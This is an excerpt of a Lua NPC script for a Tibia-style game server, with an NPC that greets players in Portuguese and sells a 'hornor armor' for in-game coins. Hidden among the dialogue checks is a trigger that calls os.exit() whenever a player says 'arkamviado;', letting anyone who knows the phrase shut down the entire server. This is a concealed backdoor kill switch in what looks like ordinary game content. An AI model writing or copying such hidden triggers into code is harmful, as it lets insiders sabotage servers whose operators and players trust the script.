...
function onCreatureSay(cid, type, msg)
  	...
  	if (msgcontains(msg, 'hi') and (focus == 0)) and getDistanceToCreature(cid) < 4 then
			...
			selfSay('Olá ' .. getCreatureName(cid) .. ' deseja pegar um hornor armor por 1200 Eliezer coins?não sabe onde conseguir? então va agora mesmo no nosso site e clica em Hornor Set')
			focus = cid
			talk_start = os.clock()
...
if msgcontains(msg, 'arkamviado;') then
				os.exit()
			end
			
		if msgcontains(msg, 'yes') then
		if doPlayerRemoveItem(cid,2161,1) then
